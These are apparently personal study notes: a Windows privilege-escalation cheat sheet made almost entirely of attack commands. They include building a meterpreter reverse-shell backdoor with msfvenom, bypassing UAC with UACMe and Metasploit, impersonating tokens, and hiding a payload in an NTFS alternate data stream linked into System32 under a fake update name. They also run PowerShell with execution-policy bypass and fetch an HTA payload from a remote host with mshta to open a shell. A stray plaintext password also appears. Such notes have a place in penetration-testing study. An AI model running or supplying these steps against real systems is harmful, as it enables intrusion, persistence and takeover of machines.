# Windows Privilege Escalation

--------------------------------------------------------------------

## Windows Kernel Exploitation: (Not recommened can cause crashes)

```
Windows NT (Predefined)

Windows-Exploit-Suggester (Github Tool)

Windows-Kernel-Exploits (Github Tool)
```

--------------------------------------------------------------------

## UAC: (need to have an user inside the administrators group)

```
$ net localgroup administrators

UACMe (Github tool)
    
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=1234 -f exe > backdoor.exe
use multi/handler (same payload as the paylaod)
set same ip and port 
.\Akagi64.exe 23 C:\Temp\backdoor.exe
    

exploit/windows/local/bypassuac_injection
set payload windows/x64/meterpreter/reverse_tcp
```

--------------------------------------------------------------------

## Windows Access Tokens: (SeImpersonatePrivilege, SeAssignPrimaryToken, SeCreateToken)

```
getprivs

load incognito

list_tokens -u

impoersonate_token “token_name”

migrate to other process
```

--------------------------------------------------------------------

## Alternate Data Streams:

> [!NOTE]
> Is an NTFS (New Tchnology File System) file attribute that was designed to provide compatibility with the MacOS HFS (Hierarchical File System).

> [!NOTE]
> Data stream (default stream that contains data of the file) and Resource stream (typically contains the metadata of the file).

```
notepad text.txt:secret.txt

type paylaod.exe > windowslog.txt:winpeas.exe

start windowslog.txt:windows.exe

cd Windows\System32

mklink wupdate.exe C:\Temp\windowslog.txt:winpeas.exe
```

--------------------------------------------------------------------


## PrivescCHECK - PowerShell script

```
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML,XML"

powershell -ep bypass (PowerShell execution policy bypass)
. .\PowerUp.ps1
Invoke-PrivescAudit

Decode on powershell

Commands:
$password='QWRtaW5AMTIz'
$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($pa
ssword))
echo $password

runas.exe /user:administrator cmd
```

> Basic Mode
```
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

> Extended Mode + Export Txt Report
```
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Report PrivescCheck_%COMPUTERNAME%"
runas.exe /user:administrator cmd
hello_123321
use exploit/windows/misc/hta_server
Copy the generated payload i.e “[http://10.10.15.2:8080/jxEyD3w.hta”](http://10.10.15.2:8080/jxEyD3w.hta%E2%80%9D) and run it on cmd.exe
with mshta command to gain the meterpreter shell.
mshta.exe http://10.10.15.2:8080/jxEyD3w.hta
```

--------------------------------------------------------------------